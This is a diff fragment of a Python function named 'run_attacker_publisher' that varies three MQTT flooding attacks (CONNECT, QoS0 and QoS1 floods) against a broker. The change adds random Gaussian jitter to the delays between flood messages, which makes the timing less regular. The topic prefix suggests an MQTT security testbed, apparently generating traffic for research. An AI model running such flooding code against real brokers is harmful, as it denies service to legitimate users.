@@ -105,19 +105,22 @@ def run_attacker_publisher(broker_ip, broker_port=1883):
                 if attack_type == 'connect':
                     # Attack 1: CONNECT flooding
                     plen  = random.randint(*CONNECT_FLOOD_PAYLOAD)
-                    sleep = random.randint(*CONNECT_FLOOD_SLEEP) / 1000.0
+                    base_sleep = random.randint(*CONNECT_FLOOD_SLEEP)
+                    sleep = (base_sleep + abs(random.gauss(2, 8))) / 1000.0
                     msg_t = 'connect'
 
                 elif attack_type == 'qos0':
                     # Attack 2: Fast flooding
                     plen  = random.randint(*FAST_FLOOD_PAYLOAD)
-                    sleep = random.randint(*FAST_FLOOD_SLEEP) / 1000.0
+                    base_sleep = random.randint(*FAST_FLOOD_SLEEP)
+                    sleep = (base_sleep + abs(random.gauss(2, 5))) / 1000.0
                     msg_t = 'qos0'
 
                 else:
                     # Attack 3: Heavy flooding (qos1)
                     plen  = random.randint(*HEAVY_FLOOD_PAYLOAD)
-                    sleep = random.randint(*HEAVY_FLOOD_SLEEP) / 1000.0
+                    base_sleep = random.randint(*HEAVY_FLOOD_SLEEP)
+                    sleep = (base_sleep + abs(random.gauss(2, 8))) / 1000.0
                     msg_t = 'qos1'
 
                 topic   = f"mqttsec/c{cid}/{msg_t}"
